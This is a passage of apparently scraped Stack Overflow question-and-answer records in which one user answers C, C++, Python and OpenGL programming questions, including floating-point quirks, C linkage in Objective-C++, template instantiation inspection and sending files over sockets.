  return n - floor(n) == 0.0;
}
</code></pre>

<p>And a test harness:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/time.h&gt;

int IsInteger1(double);
int IsInteger2(double);
int IsInteger3(double);

#define TIMEIT(expr, N) \
  gettimeofday(&amp;start, NULL); \
  for(i = 0; i &lt; N; i++) \
  { \
    expr; \
  } \
  gettimeofday(&amp;end, NULL); \
  printf(""%s: %f\n"", #expr, (end.tv_sec - start.tv_sec) + 0.000001 * (end.tv_usec - start.tv_usec))

int main(int argc, char **argv)
{
  const int N = 100000000;
  struct timeval start, end;
  int i;

  double d = strtod(argv[1], NULL);
  printf(""d=%lf %d %d %d\n"", d, IsInteger(d), IsInteger2(d), IsInteger3(d));

  TIMEIT((void)0, N);
  TIMEIT(IsInteger1(d), N);
  TIMEIT(IsInteger2(d), N);
  TIMEIT(IsInteger3(d), N);

  return 0;
}
</code></pre>

<p>Compile as:</p>

<pre><code>gcc isinteger.c -O3 -c -o isinteger.o
gcc main.c isinteger.o -o isinteger
</code></pre>

<p>My results, on an Intel Core Duo:</p>

<pre><code>$ ./isinteger 12345
d=12345.000000 1 1 1
(void)0: 0.357215
IsInteger1(d): 2.017716
IsInteger2(d): 1.158590
IsInteger3(d): 2.746216
</code></pre>

<p>Conclusion: the bit twiddling isn't as fast as I might have guessed.  The extra branches are probably what kills it, even though it avoids floating-point operations.  FPUs are fast enough these days that doing a <code>double</code>-to-<code>int</code> conversion or a <code>floor</code> really isn't that slow.</p>
"
"<p>I'm using the following code in order to antialias only the edges of my polygons:</p>

<pre><code>glHint(GL_POLYGON_SMOOTH_HINT, GL_NICEST);
glEnable(GL_POLYGON_SMOOTH);
</code></pre>

<p>But it doesn't work.</p>

<p>I can force enable antialiasing by the nvidia control panel, and it does antialias my application polygons. With the code above, I even enabled blending, but it has no effect. Also the rendering code shouldn't be changed since the nvidia control panel can turn it on, and it certainly cant modify my rendering code, it must be some on/off flag. What is it?</p>

<p>I've heard of ""multisampling"", but I don't need that.</p>

<p>Edit: the nvidia control panel setting is ""application controlled"" when it doesn't work.</p>
","9530","","<p>Most likely, your hardware does not support it.  Not all OpenGL implementations support antialiased polygons; see the <a href=""http://www.opengl.org/resources/faq/technical/rasterization.htm#rast0150"" rel=""nofollow"">OpenGL FAQ</a>.  I've definitely run into this problem before on a first-generation MacBook -- its GPU, the Intel GMA 950, does not support antialiased polygons.</p>
"
"<p>i am writing an application that receives data with items and version numbers. The numbers are formatted like 1.0.1 or 1.2.5. How can i compare these version numbers. I think they have to be formatted as a string first, no? If so, what option do i have to having objective C understand the 1.2.5 is newer than 1.0.1?</p>
","9530","","<p>If you know each version number will have exactly 3 integers separated by dots, you can parse them (e.g. using <a href=""http://linux.die.net/man/3/sscanf"" rel=""nofollow""><code>sscanf(3)</code></a>) and compare them:</p>

<pre><code>const char *version1str = ""1.0.1"";
const char *version2str = ""1.2.5"";
int major1, minor1, patch1;
int major2, minor2, patch2;
if(sscanf(version1str, ""%d.%d.%d"", &amp;major1, &amp;minor1, &amp;patch1) == 3 &amp;&amp;
   sscanf(version2str, ""%d.%d.%d"", &amp;major2, &amp;minor2, &amp;patch2) == 3)
{
    // Parsing succeeded, now compare the integers
    if(major1 &gt; major2 ||
      (major1 == major2 &amp;&amp; (minor1 &gt; minor2 ||
                           (minor1 == minor2 &amp;&amp; patch1 &gt; patch2))))
    {
        // version1 &gt; version2
    }
    else if(major1 == major2 &amp;&amp; minor1 == minor2 &amp;&amp; patch1 == patch2)
    {
        // version1 == version2
    }
    else
    {
        // version1 &lt; version2
    }
}
else
{
    // Handle error, parsing failed
}
</code></pre>
"
"<p>Using the latest gcc compiler, do I still have to think about these types of manual loop optimizations, or will the compiler take care of them for me well enough?</p>
","9530","","<p><strong>Check the generated assembly</strong> and see for yourself.  See if the computation for the loop-invariant code is being done inside the loop or outside the loop in the assembly code that your compiler generates.  If it's failing to do the loop hoisting, do the hoisting yourself.</p>

<p>But as <a href=""http://stackoverflow.com/questions/1982131/is-loop-hoisting-still-a-valid-manual-optimization-for-c-code/1982153#1982153"">others have said</a>, you should always profile first to find your bottlenecks.  Once you've determined that this is in fact a bottleneck, only then should you check to see if the compiler's performing loop hoisting (aka loop-invariant code motion) in the hot spots.  If it's not, help it out.</p>
"
"<p>I am new to MS batch programing.   </p>

<p>I want to copy files with matching regex to destination with same directory structure. If I use dir /b /s, I get full path of source then how can I get the relative path from source path? </p>

<p>I want DOS based batch script equivalent of something like this in bash script,</p>

<pre><code>file_list=`find ./abc/test -name ""*.c""`
for file_n in $file_list
do
    cp $file_n $targetdir/$file_n
done
</code></pre>
","9530","","<p>You can use tar with a pipe to copy the directory hierarchy properly:</p>

<pre><code>find . -name '*.[ch]' -exec tar cf - '{}' '+' | tar xf - -C $targetdir
</code></pre>
"
"<p>Why doesn't C++ have &lt;cstdfloat> header for floats like it has &lt;cstdint> for integers?</p>

<p><strong>EDIT :</strong></p>

<p>By &lt;cstdfloat> I mean header that provides typedefs for float and double. Much like qreal typedef in Qt. Hope my question is clear now.</p>
","9530","","<p>Are you perhaps looking for <a href=""http://en.wikipedia.org/wiki/Float.h"" rel=""nofollow""><code>&lt;float.h&gt;</code></a> and its C++ brother <code>&lt;cfloat&gt;</code> instead?</p>
"
"<p>I have got a structure and in it a pointer to a 2D array. But when I try to assign an actual 2D array to that pointer I do not succeed - compiler says that my pointer is a pointer to a 1D array.</p>

<p>Here's my code:</p>

<pre><code>typedef GLfloat Vertex2f[2];
typedef GLfloat TextureCoordinate[2];

typedef struct { 
    GLuint texture_name;  // OpenGL ID of texture used for this sprite 
    Vertex2f *vertices; // array of vertices 
    TextureCoordinate *texture_coords; // texture vertices to match

    GLubyte *vertex_indices;
} game_sprite;

void loadState()
{
    game_sprite ballSprite;

    createAndLoadTexture(""ball.png"", &amp;ballSprite.texture_name);

    const Vertex2f tempVerticesArray[4] =  {
        {-100.0f, -100.0f},
        {-100.0f, 100.0f},
        {100.0f, 100.0f},
        {100.0f, -100.0f}
    };

    ballSprite.vertices = &amp;tempVerticesArray; //The problem appears to be here
}
</code></pre>

<p>How can I make it work?</p>

<p>Thanks.</p>
","9530","","<p>You have two problems.  First is that <code>tempVerticesArray</code> is <code>const</code>.  You can't assign a pointer to a <code>const</code> value (<code>&amp;tempVerticesArray</code>) to a pointer to a non-<code>const</code> variable (<code>ballSprite.vertices</code>) without a typecast, so the compiler is complaining.  You should modify the <code>vertices</code> data member to be of the type <code>const Vertex2f *</code>, assuming you're not actually modifying that data ever.</p>

<p>The second problem is that as soon as <code>loadState()</code> ends, the variable <code>tempVerticesArray</code> goes out of scope, and so any dangling pointers to it (specifically <code>ballSprite.vertices</code>) are invalid.  You should make <code>tempVerticesArray</code> a <code>static</code> variable so it's not a stack variable that can go out of scope.  This is assuming that the <code>ballSprite</code> object is used after that function ends, which I'm guessing it does based on context.</p>

<p>If you <em>do</em> need to modify your vertices after initialization, you'll need to allocate for each <code>ballSprite</code> its own set of vertex data (e.g. using <code>malloc()</code>) and copy the vertex data in (e.g. using <code>memcpy()</code>).  If you don't, all <code>ballSprite</code> instances will share a pointer to the same vertex data, and when you modify it, they will all be affected.</p>
"
"<p>I have some piece of code that behaves differently under Mac OSX and Linux (Ubuntu, Fedora, ...). This is regarding type casting in arithmetic operations within printf statements. The code is compiled with gcc/g++.</p>

<p>The following</p>

<pre><code>#include &lt;stdio.h&gt;
int main () {
  float days = (float) (153*86400) / 86400.0;
  printf (""%f\n"", days);
  float foo = days / 30.6;
  printf (""%d\n"", (int) foo);
  printf (""%d\n"", (int) (days / 30.6));
  return 0;
}
</code></pre>

<p>generates on Linux</p>

<pre><code>153.000000
5
4
</code></pre>

<p>and on Mac OSX</p>

<pre><code>153.000000
5
5
</code></pre>

<p>Why?</p>

<p>To my surprise this here works on both Mac OSX and Linux</p>

<pre><code>printf (""%d\n"", (int) (((float)(153 * 86400) / 86400.0) / 30.6));
printf (""%d\n"", (int) (153 / 30.6));
printf (""%.16f\n"",    (153 / 30.6));
</code></pre>

<p>Why? I don't have a clue at all. THX.</p>
","9530","","<p>For starters, read <a href=""http://docs.sun.com/source/806-3568/ncg_goldberg.html"" rel=""nofollow"">What Every Computer Scientist Should Know About Floating-Point Arithmetic</a>.</p>

<p>Because 30.6 is not <strong>exactly</strong> representable in IEEE 754 floating-point, the precise results you get will not be exactly correct.  So you might get slightly less than 5.0 before casting to an integer, and then the integer cast rounds down to 4.</p>

<p>The exact result you get depends on a lot of factors, such as how the intermediate results are being computed.  Your compiler might be generating code to use the x87 floating-point stack, which uses 80-bit registers for intermediate calculations.  Alternatively, you might be using SSE2 (the default on Mac OS X), which uses 128-bit vector registers divided into either 4x32-bit or 2x64-bit.  Check your compiler's assembly output for the type of floating-point operations used.  See <a href=""http://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/i386-and-x86_002d64-Options.html"" rel=""nofollow"">this page</a> for a list of GCC command-line options you can use to control the type of floating-point instructions used, particularly the <code>-mfpmath</code> option.</p>
"
"<p>Apart from C++, <strong>which non-toy languages have direct or easy-to-use compatibility to C?</strong>  As in ""I can take a C library out there, and compile my code against it without having to find, write, or configure some kind of wrapper."" </p>

<p>I know that lots of languages have compatibility with C <strong>through some form of external call or binding</strong> (I've been using bindings in Java, Ruby, Python, etc., so I know it can be done).  But you rely on someone (possibly you), to write and maintains a binding for <em>all</em> the libraries you want to use, and the binding has to works on all platforms, etc.</p>

<p>Do more expressive languages than C++ have this feature?</p>

<p><em>Thanks to all for the mentions of swig or related wrapper-generation tools.
I am aware that those exists, but I don't think they're really as easy as C->C++ integration... but then integrating with C might be the only thing that is easier in C++ ;) )</em></p>
","9530","","<p>The <a href=""http://www.digitalmars.com/d/"" rel=""nofollow"">D language</a> is compatible with the C ABI.  However, it's sometimes non-trivial to convert C header files into compatible D modules.  See <a href=""http://www.digitalmars.com/d/2.0/htomodule.html"" rel=""nofollow"">this page</a> for more details.</p>
"
"<p>my program generates random numbers with up to 6 digits with </p>

<pre><code>int number = arc4random % 1000000;
</code></pre>

<p>I want that my program do something when a number like 66 or 4444 or 77777 appears (<em>multidigit number with all digits identical</em>). I could manual write:</p>

<pre><code>    switch (number) {
    case 11: blabla...;
    case 22: blabla...;
    (...)
    case 999999: blabla;
}
</code></pre>

<p>That would cost me many program code. (45 cases...)</p>

<p>Is there an easy way to solve the problem.</p>
","9530","","<p>Here's one way to check that all digits are the same:</p>

<pre><code>bool AllDigitsIdentical(int number)
{
    int lastDigit = number % 10;
    number /= 10;
    while(number &gt; 0)
    {
        int digit = number % 10;
        if(digit != lastDigit)
            return false;
        number /= 10;
    }

    return true;
}
</code></pre>
"
"<p>I am trying to figure out why when I convert my main.m file to a main.mm file, it no longer will link properly.</p>

<p>I have reduces the problem to the following example code:</p>

<pre><code>#import &lt;Foundation/Foundation.h&gt;
#import &lt;AppKit/AppKit.h&gt;
int main( int argc, const char ** argv ) {
return NSApplicationMain( argc, argv);
}
</code></pre>

<p>I am using gnustep and linux.  I enter the following commands and everything works as expected:</p>

<p>g++ -g -c main.m -I/usr/GNUstep/Local/Library/Headers -I/usr/GNUstep/System/Library/Headers</p>

<p>g++ -g -o test main.o -L/usr/GNUstep/Local/Library/Libraries -L/usr/GNUstep/System/Library/Libraries -lgnustep-base -lgnustep-gui</p>

<p>Now if I rename main.m to main.mm and use these two commands ( same exept main.m now main.mm):</p>

<p>g++ -g -c main.mm -I/usr/GNUstep/Local/Library/Headers -I/usr/GNUstep/System/Library/Headers</p>

<p>g++ -g -o test main.o -L/usr/GNUstep/Local/Library/Libraries -L/usr/GNUstep/System/Library/Libraries -lgnustep-base -lgnustep-gui</p>

<p>I get the following error:
main.mm:7: undefined reference to `NSApplicationMain(int, char const**)'</p>

<p>Can someone please find what I am doing wrong?  I do not see why it is now failing to link.</p>

<p>I am trying to add some C++ classes to an objective c program and this is preventing me from continuing.</p>

<p>Thank you for any help you can provide.</p>
","9530","","<p>The problem is that when you compile it as C++, the compiler <a href=""http://en.wikipedia.org/wiki/Name_mangling"">mangles the name</a> of the symbol <code>NSApplicationMain</code>, so it can't find it, since it's looking for something like <code>__Z17NSApplicationMainiPPKc</code>.  You can use the <code>nm</code> program (from binutils) to see what symbols the object files are referencing:</p>

<pre><code>$ # When compiled as Objective-C:
$ nm main.o | grep NSApplicationMain
                 U NSApplicationMain
$ # When compiled as Objective-C++:
$ nm main.o | grep NSApplicationMain
                 U _Z17NSApplicationMainiPPKc
</code></pre>

<p>In order to avoid this problem, C functions need to be declared with an <a href=""http://www.parashift.com/c++-faq-lite/mixing-c-and-cpp.html#faq-32.3""><code>extern ""C""</code></a> modifier in order to tell the compiler not to mangle the name.  Looking into <code>&lt;AppKit/NSApplication.h&gt;</code>, the header file where <code>NSApplicationMain</code> is declared, I see this:</p>

<pre><code>APPKIT_EXPORT int
NSApplicationMain(int argc, const char **argv);
</code></pre>

<p>Alas, <code>APPKIT_EXPORT</code> is defined to be one of <code>extern</code>, <code>__declspec(dllexport)</code>, <code>extern __declspec(dllexport)</code>, or nothing in <code>&lt;AppKit/AppKitDefines.h&gt;</code>.  Since it's also used for global variable declarations, we can't get around this by redefining it to <code>extern ""C""</code> (which would be extremely hacky and kludgy anyways).  The AppKit header files do not seem to contain any <code>extern ""C""</code> declarations at all, although I do see them in various header files under <code>Foundation/</code> and <code>GNUStepBase/</code>.</p>

<p>So what can you do?  The solution is to wrap your includes with an <code>extern ""C""</code>:</p>

<pre><code>extern ""C""
{
#import &lt;Foundation/Foundation.h&gt;
#import &lt;AppKit/AppKit.h&gt;
}

int main( int argc, const char ** argv ) {
  return NSApplicationMain( argc, argv);
}
</code></pre>

<p>This will give the functions defined in those header files the proper linkage, and it will all work out.  But you shouldn't have to do this -- I would file a bug report with GNUstep, telling them to add proper <code>extern ""C""</code> declarations to their header files.</p>
"
"<p>I want to display:</p>

<p><code>49</code> as <code>49.00</code></p>

<p>and:</p>

<p><code>54.9</code> as <code>54.90</code></p>

<p>Regardless of the length of the decimal or whether there are are any decimal places, I need to display the number with 2 decimal places, and I'd like to do it in an efficient way. The purpose is to display money values.</p>

<p>eg, <code>4898489.00</code></p>
","9530","","<p>You can use the <a href=""http://docs.python.org/library/stdtypes.html#string-formatting"">string formatting operator</a> as so:</p>

<pre><code>f = 49
x = ""%.2f"" % f  # x is now the string ""49.00""
</code></pre>

<p>I'm not sure what you mean by ""efficient"" -- this is almost certainly <em>not</em> the bottleneck of your application.  If your program is running slowly, profile it first to find the hot spots, and then optimize those.</p>
"
"<p>I want to retrieve the bit depth for a jpeg file using Python.</p>

<p>Using the Python Imaging Library:</p>

<pre><code>import Image
data = Image.open('file.jpg')
print data.depth
</code></pre>

<p>However, this gives me a depth of 8 for an obviously 24-bit image. Am I doing something wrong? Is there some way to do it with pure Python code?</p>

<p>Thanks in advance.</p>

<p>Edit: It's data.bits not data.depth.</p>
","9530","","<p>I don't see the <code>depth</code> attribute documented anywhere in the <a href=""http://www.pythonware.com/library/pil/handbook/index.htm"">Python Imaging Library handbook</a>.  However, it looks like only a limited number of <a href=""http://www.pythonware.com/library/pil/handbook/concepts.htm"">modes</a> are supported.  You could use something like this:</p>

<pre><code>mode_to_bpp = {'1':1, 'L':8, 'P':8, 'RGB':24, 'RGBA':32, 'CMYK':32, 'YCbCr':24, 'I':32, 'F':32}

data = Image.open('file.jpg')
bpp = mode_to_bpp[data.mode]
</code></pre>
"
"<p>I have a simple function template:</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

template &lt;class T&gt;
T GetMax (T a, T b) {
  T result;
  result = (a &gt; b) ? a : b;
  return (result);
}

int main () {
  cout &lt;&lt; GetMax&lt;int&gt;(5, 6) &lt;&lt; endl;
  cout &lt;&lt; GetMax&lt;long&gt;(10, 5) &lt;&lt; endl;
  return 0;
}
</code></pre>

<p>The above example will generate 2 function template instantiations, one for <em>int</em> and another for <em>long</em>. Is there any g++ option to view the function template instantiations?</p>
","9530","","<p>You can use the <code>nm</code> program (part of <a href=""http://www.gnu.org/software/binutils/"">binutils</a>) to see the list of symbols used by your program.  For example:</p>

<pre><code>$ g++ test.cc -o test
$ nm test | grep GetMax
00002ef0 T __Z6GetMaxIiET_S0_S0_
00002f5c T __Z6GetMaxIiET_S0_S0_.eh
00002f17 T __Z6GetMaxIlET_S0_S0_
00002f80 T __Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>I don't know why each one has two copies, one with a <code>.eh</code> suffix, but otherwise you can tell that this particular function was instantiated twice.  If you version of <code>nm</code> supports the <code>-C/--demangle</code> flag, you can use that to get readable names:</p>

<pre><code>$ nm --demangle test | grep GetMax
00002ef0 T int GetMax&lt;int&gt;(int, int)
00002f5c T _Z6GetMaxIiET_S0_S0_.eh
00002f17 T long GetMax&lt;long&gt;(long, long)
00002f80 T _Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>If that option isn't supported, you can use <a href=""http://sourceware.org/binutils/docs-2.16/binutils/c_002b_002bfilt.html""><code>c++filt</code></a> to demangle them:</p>

<pre><code>$ nm test | grep GetMax | c++filt
00002ef0 T int GetMax&lt;int&gt;(int, int)
00002f5c T __Z6GetMaxIiET_S0_S0_.eh
00002f17 T long GetMax&lt;long&gt;(long, long)
00002f80 T __Z6GetMaxIlET_S0_S0_.eh
</code></pre>

<p>So, you can see that <code>GetMax</code> was instantiated with <code>int</code> and <code>long</code> respectively.</p>
"
"<p>I know that there are already several questions on StackOverflow about <code>std::string</code> versus <code>std::wstring</code> or similar but none of them proposed a full solution. </p>

<p>In order to obtain a good answer I should define the requirements:</p>

<ul>
<li><strong>multiplatform</strong> usage, must work on Windows, OS X and Linux</li>
<li>minimal effort for <strong>conversion to/from platform specific Unicode strings</strong> like <code>CFStringRef</code>, <code>wchar_t *</code>, <code>char*</code> as UTF-8 or other types as they are required by OS API. Remark: I don't need code-page convertion support because I expect to use only Unicode compatible functions on all operating systems supported.</li>
<li>if requires an external library, this one should be <strong>open-source</strong> and under a very liberal license like BSD but not LGPL.</li>
<li>be able to use a <strong>printf format</strong> syntax or similar.</li>
<li>easy way of string allocation/deallocation </li>
<li>performance is not very important because I assume that the Unicode strings are used only for application UI.</li>
<li>some example could would be appreciated</li>
</ul>

<p>I would really appreciate only <strong>one proposed solution per answer</strong>, by doing this people may vote for their prefered alternative. If you have more than one alternative just add another answer.</p>

<p>Please indicate something that <strong>did worked for you</strong>.</p>

<p>Related questions:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/402283/stdwstring-vs-stdstring"">stdwstring-vs-stdstring</a></li>
<li><a href=""http://stackoverflow.com/questions/621635/does-c0x-support-stdwstring-conversion-to-from-utf-8-byte-sequence"">does-c0x-support-stdwstring-conversion-to-from-utf-8-byte-sequence</a></li>
<li><a href=""http://stackoverflow.com/questions/467139/portable-wchart-in-c"">portable-wchart-in-c</a></li>
</ul>
","9530","","<p>I would strongly recommend using UTF-8 internally in your application, using regular old <code>char*</code> or <code>std::string</code> for data storage.  For interfacing with APIs that use a different encoding (ASCII, UTF-16, etc.), I'd recommend using <a href=""http://www.gnu.org/software/libiconv/"">libiconv</a>, which is licensed under the LGPL.</p>

<p>Example usage:</p>

<pre><code>class TempWstring
{
public:
  TempWstring(const char *str)
  {
    assert(sUTF8toUTF16 != (iconv_t)-1);
    size_t inBytesLeft = strlen(str);
    size_t outBytesLeft = 2 * (inBytesLeft + 1);  // worst case
    mStr = new char[outBytesLeft];
    char *outBuf = mStr;
    int result = iconv(sUTF8toUTF16, &amp;str, &amp;inBytesLeft, &amp;outBuf, &amp;outBytesLeft);
    assert(result == 0 &amp;&amp; inBytesLeft == 0);
  }

  ~TempWstring()
  {
    delete [] mStr;
  }

  const wchar_t *Str() const { return (wchar_t *)mStr; }

  static void Init()
  {
    sUTF8toUTF16 = iconv_open(""UTF-16LE"", ""UTF-8"");
    assert(sUTF8toUTF16 != (iconv_t)-1);
  }

  static void Shutdown()
  {
    int err = iconv_close(sUTF8toUTF16);
    assert(err == 0);
  }

private:
  char *mStr;

  static iconv_t sUTF8toUTF16;
};

iconv_t TempWstring::sUTF8toUTF16 = (iconv_t)-1;

// At program startup:
TempWstring::Init();

// At program termination:
TempWstring::Shutdown();

// Now, to convert a UTF-8 string to a UTF-16 string, just do this:
TempWstring x(""Entr\xc3\xa9""""e"");  // ""Entrée""
const wchar_t *ws = x.Str();  // valid until x goes out of scope

// A less contrived example:
HWND hwnd = CreateWindowW(L""class name"",
                          TempWstring(""UTF-8 window title"").Str(),
                          dwStyle, x, y, width, height, parent, menu, hInstance, lpParam);
</code></pre>
"
"<p>I am building a server-client program with c and having some problen wtih sendina a whole file with  send() and recv() function. I need to send the whole file with these but all these functions can do is send a string. The main problem is with sending the exe or other binary formet data. Should I use htons or htonl func? I dunno how to use those along these as I am merely a noob. </p>

<p>I am stuck with this and love your help. Thanks!!</p>

<p>Here is the server side recv function ::</p>

<pre><code>if (socket_type != SOCK_DGRAM)
    {

            fi = fopen (final,""wb"");
            retval = recv(msgsock, recv_buf, strlen(recv_buf), 0);
            /*recv_buf[retval] = '\0';
            fprintf (fi,""%s"",recv_buf);*/

            int i;
            i=atoi(recv_buf);
            char *q;
            q=(char *)malloc(i*sizeof(char));
            retval = recv(msgsock, q, strlen(q), 0);
            //printf (""%s"",q);
            fwrite(q,i,1,fi);
            fclose(fi);

    }
    else
    {
        retval = recvfrom(msgsock,recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&amp;from, &amp;fromlen);
        printf(""Server: Received datagram from %s\n"", inet_ntoa(from.sin_addr));
        printf (""SOCK_DGRAM"");
    }

    if (retval == SOCKET_ERROR)
    {
        fprintf(stderr,""Server: recv() failed: error %d\n"", WSAGetLastError());
        closesocket(msgsock);
        //continue;
    }
    else
        printf(""Server: recv() is OK.\n"");

    if (retval == 0)
    {
        printf(""Server: Client closed connection.\n"");
        closesocket(msgsock);
            //continue;
    }
    printf(""Server: Received %d bytes, data from client\n"", retval);
</code></pre>

<p>The client side sending function :::</p>

<p>void send_command()
{
    int bytesent;
    FILE *file_out;
    //file_out = fopen(file_path,""rb"");
    char str_all[100000];//flag [30]=""end"";</p>

<pre><code>///////////////////////getsize//////////////
char fsize[5];
int filesize;
file_out = fopen(file_path, ""rb"");
fseek(file_out, 0, SEEK_END);
filesize = ftell(file_out);
rewind (file_out);
itoa (filesize,fsize,10);
/////////////////////////////////////////////
send (ConnectSocket, fsize, strlen (fsize), 0);

char *r = (char *)malloc (filesize * sizeof(char));

fread(r,filesize,1,file_out);
bytesent = send( ConnectSocket, r, strlen(r), 0 );
printf(""\nClient: Bytes sent: %ld\n"", bytesent);
fclose (file_out);

/*while (fscanf(file_out,""%s"",&amp;str_all) != EOF)
{
    bytesent = send( ConnectSocket, str_all, strlen(str_all), 0 );
    printf(""\nClient: Bytes sent: %ld\n"", bytesent);
    //Sleep(500);
}*/

/*printf(""%s"",flag);
send( ConnectSocket, flag, strlen(flag), 0 );*/
WSACleanup();
//return 0;
}
</code></pre>
","9530","","<p>You'll need to implement that functionality yourself, or use a library that does so.  <code>send(2)</code> just sends a raw byte buffer.  If you want to send a file, you'll need to use some sort of <em>protocol</em> that both the client and the server understand.</p>

<p>The simplest possible protocol might be to have the client send the filename, the length of the file, and then the raw file data.  For example (error checking omitted for clarity):</p>

<pre><code>// Server:
const char *filename = ...;
uint32_t filenameLen = strlen(filename);
uint32_t filenameLenNet = htonl(filenameLen);
send(fd, &amp;filenameLenNet, sizeof(filenameLenNet), 0);
send(fd, filename, filenameLen, 0);

// You should probably use a 64-bit file length; also, for large files, you
// don't want to read the entire file into memory, you should just stream it
// from disk to network in reasonably-sized chunks.
const void *fileData = ...;
uint32_t fileLen = ...;
uint32_t fileLenNet = htonl(fileLen);
send(fd, &amp;fileLenNet, sizeof(fileLenNet), 0);
send(fd, fileData, fileLen, 0);

// Client:
char *filename;
uint32_t filenameLen;
recv(fd, &amp;filenameLen, sizeof(filenameLen), 0);
filenameLen = ntohl(filenameLen);
filename = malloc(filenameLen + 1);
recv(fd, filename, filenameLen, 0);
filename[filenameLen] = 0;
uint32_t fileLen;
recv(fd, &amp;fileLen, sizeof(fileLen), 0);
fileLen = ntohl(fileLen);
void *fileData = malloc(fileLen);
recv(fd, fileData, fileLen, 0);
// Write file Data to the output file.  Again, for large files, it would be
// better to stream it in in chunks instead of reading it all in at once.
</code></pre>

<p>Also, be careful about partial sends/receives.  Make sure you check the return values from <code>send</code> and <code>recv</code>, since they can (and do) often only send or receive a subset of the data you intent to send or receive.  When that happens, you have to recover by resending or rereceiving in a loop until you've processed all the data you intended or an error occurs.</p>

<p>As an alternative to using your own protocol, you can use an existing protocol with a library such as <a href=""http://sourceforge.net/projects/libftp/"" rel=""nofollow"">libftp</a> or <a href=""http://curl.haxx.se/"" rel=""nofollow"">libcurl</a>.</p>
"
"<p>I'm playing around with an eager-initializing generic singleton class. The idea is that you inherit publicly from the class like so:</p>

<pre><code>class foo : public singleton&lt;foo&gt; { };
</code></pre>

<p>I've learned a lot in the process but I'm stuck right now because it's breaking my Visual Studio 2008 linker. The problem is with the static instance member and/or its initialization.</p>

<pre><code>template&lt;class T&gt;
class singleton {
    singleton();
    singleton(singleton const &amp;);
    singleton &amp; operator = (singleton const &amp;);
public:
    static T &amp; instance;
};
template&lt;class T&gt; T &amp; T::instance;
</code></pre>

<p>Any insight would be greatly appreciated!</p>

<p>EDIT:</p>

<p>With this class declaration...</p>

<pre><code>template&lt;class T&gt;
class singleton {
    singleton();
    singleton(singleton const &amp;);
    singleton &amp; operator = (singleton const &amp;);
public:
    static T instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance;
</code></pre>

<p>When I try to do this...</p>

<pre><code>class foo : public singleton&lt;foo&gt; { };
</code></pre>

<p>I get this error...</p>

<blockquote>
  <p>error C2248: 'singleton::singleton'
  : cannot access private member
  declared in class 'singleton'</p>
  
  <p>...</p>
  
  <p>This diagnostic occurred in the compiler generated function 'foo::foo(void)'</p>
</blockquote>

<p>My interpretation is that singleton wants to construct a foo object which, by inheritance, depends on the construction of a singleton whose constructor is private. I figured singleton would have access to its own constructor but I guess not. Any ideas?</p>

<p>EDIT 2:</p>

<p>I've realized that the approach of inheriting from <code>singleton&lt;T&gt;</code> has the problem of requiring change to the class to be used as a singleton. I've ended up with the following code for my eager-initializing singleton class template.</p>

<pre><code>template&lt;typename T&gt;
class singleton_wrapper {
    singleton_wrapper();
    singleton_wrapper(singleton_wrapper const &amp;);
    singleton_wrapper &amp; operator = (singleton_wrapper const &amp;);
    static T instance;
    template&lt;typename T&gt; friend T &amp; singleton();
};
template&lt;typename T&gt; T singleton_wrapper&lt;T&gt;::instance;

template&lt;typename T&gt;
T &amp; singleton() {
    return singleton_wrapper&lt;T&gt;::instance;
}
</code></pre>

<p>For class...</p>

<pre><code>class foo {
public:
    void bar() { }
};
</code></pre>

<p>...One would access a single instance of it (initialized before main()) using the following:</p>

<pre><code>singleton&lt;foo&gt;().bar();
</code></pre>

<p>Thanks again for the help, especially GMan. I'm very pleased with my first experience on stack*<em>overflow</em>*.</p>
","9530","","<p>You can't, since you don't have a concrete instance.  You can need to create an actual instance that you can refer to:</p>

<pre><code>template &lt;class T&gt;
class singleton {
    ...
private:
    static T instance_;
public:
    static T&amp; instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance_;
template &lt;class T&gt; T&amp; singleton&lt;T&gt;::instance = singleton&lt;T&gt;::instance;
</code></pre>

<p>Or, more simply, just ditch the reference altogether:</p>

<pre><code>template &lt;class T&gt;
class singleton {
    ...
public:
    static T instance;
};
template &lt;class T&gt; T singleton&lt;T&gt;::instance;
</code></pre>
"
"<p>If I have a function that performs some procedure and then needs to return the truth value of something is there a compelling reason to use either a boolean variable, or an int variable, as the return type?  </p>

<pre><code>bool Foo()
{
  ...
  ...
  return truthValue;
}

int Foo()
{
  ...
  ...
  return truthValue;
}
</code></pre>

<p>Is there an appreciable difference between these two functions?  What are some potential pitfalls and advantages to both of them?</p>

<p>thanks,</p>

<p>nmr</p>
","9530","","<p>Use <code>bool</code> -- it more clearly conveys the semantic meaning of your code.  If another developer reads your code and sees a return type of <code>bool</code>, he immediately understands that it returns a truth value.  If instead he sees that it returns an <code>int</code>, he has to dig a little further and spend more time figuring out the interface to the function (e.g. reading documentation or reading the code), which slows him down.</p>

<p>The only reason to use <code>int</code> is if you need to interface with legacy code and/or conform to a particular interface (e.g. your function gets its address taken and passed to a third-party library that expects a function of a certain prototype).</p>
"
"<p>Are multi-line macros supported(compilable) in gcc version 3.2.4. I am trying to build my source which has multi-line macros on a linux host using above mentioned gcc version.
I get compilation error at the macro, which is multiline.</p>

<pre><code>      #define YYCOPY(To, From, Count)       \
      do                    \
     {                  \
       YYSIZE_T yyi;                \
       for (yyi = 0; yyi &lt; (Count); yyi++)  \
         (To)[yyi] = (From)[yyi];       \
     }                  \
      while (0)
</code></pre>

<p>If they are not supported, what is the workaround for this, converting the macro to a function or some other compiler option can help?</p>

<p>thank you.</p>

<p>-AD</p>
","9530","","<p>The ANSI C specification requires compilers to support this -- specifically, the standard says that if a line ends in a backslash immediately before the newline, the preprocessor is to treat that line and the subsequent line as one logical line, as if both the backslash and the newline did not exist.  If a preprocessor does not do this, it is not a conforming preprocessor (or more technically, a <em>translator</em>, as the standard calls it).</p>

<p>GCC strives to be as conforming as possible to the ANSI C standard.  Yes, it support multiline macros defined with backslashes at the end of lines.</p>

<p>The reason you're getting compiler errors is something else.  You're not using the macro properly.  Without posting the exact error messages you're receiving and the code which invokes the macro, it's impossible to say what you're doing wrong.</p>
"
